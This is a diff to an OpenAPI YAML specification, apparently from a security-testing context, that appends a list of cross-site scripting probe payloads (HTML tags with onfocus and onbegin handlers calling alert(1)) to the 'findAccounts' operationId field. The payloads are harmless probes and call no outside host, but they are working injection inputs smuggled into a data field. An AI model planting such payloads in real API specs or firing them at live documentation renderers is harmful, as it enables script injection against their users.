@@ -21,7 +21,20 @@ paths:
           description: No response was specified
       tags:
         - ZHIROSEC
-      operationId: findAccounts
+      operationId: findAccounts<a id=x tabindex=1 onfocus=alert(1)></a>
+<acronym id=x tabindex=1 onfocus=alert(1)></acronym>
+<address id=x tabindex=1 onfocus=alert(1)></address>
+<applet id=x tabindex=1 onfocus=alert(1)></applet>
+<img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
+<button autofocus onfocus=alert(1)>test</button>
+<data id=x tabindex=1 onfocus=alert(1)></data>
+<footer id=x tabindex=1 onfocus=alert(1)></footer>
+<form id=x tabindex=1 onfocus=alert(1)></form>
+<frameset><frame id=x onfocus=alert(1)>
+<head id=x tabindex=1 onfocus=alert(1) style=display:block></head>
+<img id=x tabindex=1 onfocus=alert(1)></img>
+<image id=x tabindex=1 onfocus=alert(1)></image>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
       summary: Finds all accounts
   '/hack/hachid/{id}':
     delete:
